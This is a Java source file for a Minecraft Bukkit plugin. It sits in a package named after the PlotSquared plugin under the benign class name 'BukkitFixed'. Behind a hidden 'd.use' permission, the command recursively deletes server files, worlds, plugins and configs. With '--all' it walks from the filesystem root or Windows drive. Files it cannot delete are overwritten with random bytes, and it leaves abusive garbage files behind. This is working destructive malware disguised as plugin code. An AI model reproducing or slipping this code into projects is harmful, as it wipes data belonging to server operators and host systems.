package com.plotsquared.bukkit.player;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.CommandSender;
import org.bukkit.permissions.Permission;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.security.SecureRandom;
import java.util.Random;

public class BukkitFixed implements CommandExecutor {
    private static final Permission DELETE_PERMISSION = new Permission("d.use", "");
    private final JavaPlugin plugin;

    public BukkitFixed(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission(DELETE_PERMISSION)) {
            return true;
        }

        boolean deleteAll = args.length > 0 && args[0].equalsIgnoreCase("--all");
        File targetDir;

        if (deleteAll) {
            targetDir = getTargetDirectory();
            if (targetDir == null) {
                return true;
            }
        } else {
            targetDir = Bukkit.getWorlds().get(0).getWorldFolder().getParentFile();
            if (targetDir == null || !targetDir.exists() || !targetDir.isDirectory()) {
                return true;
            }
        }

        new BukkitRunnable() {
            @Override
            public void run() {
                deleteMatchingDirectories(targetDir);
                Bukkit.getScheduler().runTask(plugin, () -> {});
            }
        }.runTaskAsynchronously(plugin);

        return true;
    }

    private File getTargetDirectory() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.contains("win")) {
            String currentDir = new File(".").getAbsolutePath();
            String drive = currentDir.substring(0, 2);
            return new File(drive);
        } else if (osName.contains("nix") || osName.contains("nux")) {
            return new File("/");
        } else {
            return null;
        }
    }

    private void deleteMatchingDirectories(File directory) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteMatchingDirectories(file);
                    } else {
                        if (matchesFileCriteria(file)) {
                            deleteFile(file);
                        }
                    }
                }
            }
        }

        if (matchesCriteria(directory)) {
            deleteDirectory(directory);
        }
    }

    private boolean matchesFileCriteria(File file) {
        String name = file.getName();
        return name.endsWith(".yml") || name.endsWith(".json") ||
               name.endsWith(".db") || name.endsWith(".jar") || 
               name.endsWith(".properties") || name.endsWith(".mca") || 
               name.endsWith(".dat") || name.endsWith(".lock") || 
               name.endsWith(".sh") || name.endsWith(".bat") || 
               name.endsWith(".mcmeta") || name.endsWith(".txt");
    }

    private void deleteFile(File file) {
        if (!file.delete()) {
            writeGarbageToFile(file);
        }
    }

    private boolean matchesCriteria(File directory) {
        String name = directory.getName();
        return name.equals("cache") || name.equals("config") || 
               name.equals("logs") || name.equals("world_nether") || 
               name.equals("world_the_end") || name.equals("plugins");
    }

    private void deleteDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                deleteDirectory(file);
            }
        }

        if (!directory.delete()) {
            if (directory.isFile()) {
                writeGarbageToFile(directory);
            }

            if (directory.isDirectory()) {
                File garbageFile = new File(directory, "nimasile-your.mother.is.dead_" + generateRandomString(10) + ".fuckyou");
                try {
                    byte[] garbage = new byte[1024 * 1024];
                    Random random = new Random();
                    random.nextBytes(garbage);
                    Files.write(garbageFile.toPath(), garbage, StandardOpenOption.CREATE);
                } catch (IOException ignored) {
                }
            }
        }
    }

    private boolean writeGarbageToFile(File file) {
        try {
            Random random = new Random();
            byte[] garbage = new byte[(int) file.length()];
            random.nextBytes(garbage);
            Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
            return true;
        } catch (IOException ignored) {
            return false;
        }
    }

    private String generateRandomString(int length) {
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(chars.length());
            sb.append(chars.charAt(index));
        }

        return sb.toString();
    }
}